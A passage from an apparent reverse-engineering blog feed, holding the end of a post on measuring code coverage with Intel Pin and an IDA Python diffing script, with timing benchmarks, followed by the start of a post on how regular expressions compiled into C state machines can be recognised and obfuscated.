<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idc</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idaapi</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">nbins</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Color &#39;nbins&#39; instructions starting from ea&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">colors</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;black&#39;</span> <span class="p">:</span> <span class="mh">0x000000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;red&#39;</span> <span class="p">:</span> <span class="mh">0x0000FF</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;blue&#39;</span> <span class="p">:</span> <span class="mh">0xFF0000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;green&#39;</span> <span class="p">:</span> <span class="mh">0x00FF00</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nbins</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">del_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">set_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">colors</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
</span><span class='line'>        <span class="n">ea</span> <span class="o">+=</span> <span class="n">idc</span><span class="o">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the first JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l1</span> <span class="o">=</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the second JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l2</span> <span class="o">=</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">AskStr</span><span class="p">(</span><span class="s">&#39;black&#39;</span><span class="p">,</span> <span class="s">&#39;Which color do you want ?&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addresses_l1</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">l1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">addresses_l2</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">l2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dic_l2</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">((</span><span class="n">k</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span> <span class="n">k</span><span class="p">[</span><span class="s">&#39;nbins&#39;</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">l2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">diff</span> <span class="o">=</span> <span class="n">addresses_l2</span> <span class="o">-</span> <span class="n">addresses_l1</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> bbls in the first execution&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> bbls in the second execution&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l2</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Differences between the two executions: </span><span class="si">%d</span><span class="s"> bbls&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">addresses_l1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l2</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">funcs</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">color</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">dic_l2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">c</span><span class="p">)</span>
</span><span class='line'>            <span class="n">funcs</span><span class="p">[</span><span class="n">get_func</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">startEA</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;fail </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;A total of </span><span class="si">%d</span><span class="s"> different sub:&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">funcs</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">funcs</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;done&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>By the way, you must keep in mind we are only talking about <strong>deterministic</strong> program (will always execute the same path if you give it the same inputs). If the same inputs aren&rsquo;t giving the exact same outputs <strong>every time</strong>, your program is not deterministic.</p>

<p>Also, don&rsquo;t forget about <a href="http://fr.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> because if you want to compare basic block addresses executed at two different times, trust me you want your binary loaded at the same base address. However, if you want to patch quickly a simple file I&rsquo;ve made a little Python script that can be handy sometimes: <a href="https://github.com/0vercl0k/stuffz/blob/master/remove_aslr_bin.py">remove_aslr_bin.py</a> ; otherwise, booting your Windows XP virtual machine is the easy solution.</p>

<h1>Does-it scale ?</h1>

<p>These tests have been done on my Windows 7 x64 laptop with Wow64 processes (4GB RAM, i7 Q720 @ 1.6GHz). All the modules living in <em>C:\Windows</em> have been blacklisted. Also, note those tests are not really accurate, I didn&rsquo;t launch each thing thousand times, it&rsquo;s just here to give you a vague idea.</p>

<h2>Portable Python 2.7.5.1</h2>

<h3>Without instrumentation</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process python.exe &quot;-c &#39;quit()&#39;&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 73,1953
</span></code></pre></td></tr></table></div></figure>


<h3>With instrumentation and JSON report serialization</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process pin.exe &quot;-t pin-code-coverage-measure.dll -o test.json -- python.exe -c &#39;quit()&#39;&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 13122,4683
</span></code></pre></td></tr></table></div></figure>


<h2>VLC 2.0.8</h2>

<h3>Without instrumentation</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process vlc.exe &quot;--play-and-exit hu&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 369,4677
</span></code></pre></td></tr></table></div></figure>


<h3>With instrumentation and JSON report serialization</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process pin.exe &quot;-t pin-code-coverage-measure.dll -o test.json -- D:\vlc.exe --play-and-exit hu&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 60109,204
</span></code></pre></td></tr></table></div></figure>


<p>To optimize the process you may want to blacklist some of the VLC plugins (there are a tons!), otherwise your VLC instrumented is 160 times slower than the normal one (and I didn&rsquo;t even try to launch the instrumentation when decoding x264 videos).</p>

<h2>Browsers ?</h2>

<p>You don&rsquo;t want to see the overhead here.</p>

<h1>Conclusion</h1>

<p>If you want to use that kind of tool for fuzzing purposes, I definitely encourage you to make a little program that uses the library you are targeting the same way your target does. This way you have a really smaller and less complicate binary to instrument, thus the instrumentation process will be far more efficient. And in this specific case, I really believe you can launch this Pintool on a large set of inputs (thousands) in order to pick inputs that cover better your target. In the other hand, if you do that directly on big software like browsers: it won&rsquo;t scale because you will pass your time instrumenting GUI or stuff you don&rsquo;t care.</p>

<p>Pin is a really powerful and accessible tool. The C++ API is really easy to use, it works with Linux, OSX, Android for x86, (even X86_64 on the important targets), there is also a doxygen documentation. What else seriously ?</p>

<p>Use it, it&rsquo;s good for you.</p>

<h1>References &amp; sources of inspiration</h1>

<p>If you find that subject cool, I&rsquo;ve made a list of cool readings:</p>

<ul>
<li><a href="http://www.hexblog.com/?p=34">Coverage analyzer</a>: You will see using Pin is <strong>really</strong> easier</li>
<li><a href="https://github.com/Cr4sh/Code-coverage-analysis-tools">Code-coverage-analysis-tool</a>: That&rsquo;s cool, but it seems to instrument at the routine level ; we wanted to have information at the basic level</li>
<li><a href="http://media.blackhat.com/bh-us-11/Diskin/BH_US_11_Diskin_Binary_Instrumentation_Slides.pdf">Binary instrumentation for security professionals</a></li>
<li><a href="http://joxeankoret.com/blog/2010/05/02/mynav-a-python-plugin-for-ida-pro/">MyNav, a python plugin</a></li>
<li><a href="http://www.zynamics.com/binnavi.html#videos">zynamics BinNavi Videos</a></li>
<li><a href="http://bitblaze.cs.berkeley.edu/papers/diffslicing_oakland11.pdf">Differential Slicing: Identifying Causal Execution Differences for Security Applications</a> (thanks for the reference <a href="https://twitter.com/joancalvet">j04n</a>!)</li>
</ul>

]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Regular expressions obfuscation under the microscope]]></title>
    <link href="http://doar-e.github.io/blog/2013/08/24/regular-expressions-obfuscation-under-the-microscope/"/>
    
    <updated>2013-08-24T12:35:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2013/08/24/regular-expressions-obfuscation-under-the-microscope</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Some months ago I came across a strange couple of functions that was kind of playing with a <a href="http://en.wikipedia.org/wiki/Finite-state_machine">finite-state automaton</a> to validate an input. At first glance, I didn&rsquo;t really notice it was in fact a regex being processed, that&rsquo;s exactly why I spent quite some time to understand those routines. You are right to ask yourself: &ldquo;Hmm but the regex string representation should be in the binary shouldn&rsquo;t it?&rdquo;, the thing is it wasn&rsquo;t. The purpose of this post is to focus on those kind of &ldquo;compiled&rdquo; regex, like when the author transform somehow the regex in a FSM directly usable in its program (for the sake of efficiency I guess). And to extract that handy string representation, you have to study the automaton.</p>

<p>In this short post, we are going to see how a regular expression looks like in assembly/C, and how you can hide/obfuscate it. I hope you will enjoy the read, and you will both be able to recognize a regular expression compiled in your future reverse-engineering tasks and to obfuscate heavily your regex!</p>

<!--more-->


<h1>Bring out the FSM</h1>

<h2>Manually</h2>

<p>Before automating things, let&rsquo;s see how we can implement a simple regex in C. It&rsquo;s always easier to reverse-engineer something you have, at least once in your life, implemented. Even if the actual implementation is slightly different from the one you did.
Let&rsquo;s say we want to have an automaton that matches &ldquo;Hi-[0-9]{4}&rdquo;.</p>

<p><strong>NOTE</strong>: I just had the chance to have a conversation with <a href="https://plus.google.com/111956453297829313313">Michal</a>, and he is totally right saying that automata ins&rsquo;t <em>really</em> the regex we said it was. Here is an example of what the regex should match: &lsquo;Hi-GARBAGEGARBAGE_Hi-1234&rsquo;. We don&rsquo;t allow our regex to like rewind the state to zero if the input doesn&rsquo;t match the regex. To do so, we could replace the return statements by a &ldquo;state = 0&rdquo; statement :). Thank you to <a href="https://plus.google.com/111956453297829313313">Michal</a> for the remark.</p>

<p>Now, if from that string representation we extract an FSM, we can have that one:</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/FSM_example.png"></p>

<p>Here is this automaton implemented in C:</p>

<figure class='code'><figcaption><span> (fsm_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">switch</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">case</span> <span class="mi">0</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;H&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">1</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;i&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">2</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">3</span> <span class="p">...</span> <span class="mi">6</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">s</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">7</span>:
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we try to execute the program:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>> fsm_example.exe garbage-Hi-1337-garbage
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe garbage-Hi-1337
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe Hi-1337-garbage
</span><span class='line'>Good boy.
</span><span class='line'>
</span><span class='line'>> fsm_example.exe Hi-dudies
</span><span class='line'>Bad boy.</span></code></pre></td></tr></table></div></figure>


<p>The purpose of that trivial example was just to show you how a regex string representation can be compiled into something harder to analyze but also more efficient (it doesn&rsquo;t need a compilation step, that&rsquo;s the reason why you may encounter that kind of thing in real (?) softwares). Even if the code seems trivial at the first sight, when you look at it at the assembly level, it takes a bit of time to figure out it&rsquo;s a simple &ldquo;Hi-[0-9]{4}&rdquo; regex.</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/cfg.png"></p>

<p>In that kind of analysis, it&rsquo;s really important to find the &ldquo;state&rdquo; variable that allows the program to pass through the different nodes of the FSM. Then, you have also to figure out how you can reach a specific node, and all the nodes reachable from a specific one. To make it short, at the end of your analysis you really want to have a clean FSM like the one we did earlier. And once you have it, you want to eliminate unreachable nodes, and to minimize it in order to remove some potential automaton obfuscation.</p>

<figure class='code'><figcaption><span> (fsm_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">switch</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">case</span> <span class="mi">0</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;H&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">1</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;i&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
